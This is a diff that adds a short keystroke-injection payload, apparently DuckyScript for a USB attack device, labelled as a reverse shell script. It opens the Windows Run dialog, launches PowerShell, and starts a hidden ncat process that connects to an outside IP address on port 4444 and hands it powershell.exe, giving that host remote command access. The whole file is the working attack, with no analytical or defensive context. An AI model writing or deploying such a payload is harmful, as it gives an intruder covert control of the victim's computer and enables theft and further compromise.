@@ -1,0 +1,12 @@
+REM Reverse shell script using ncat!
+
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 5000
+STRING Start-Process -WindowStyle Hidden ncat -ArgumentList "216.164.51.159 4444 -e powershell.exe"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
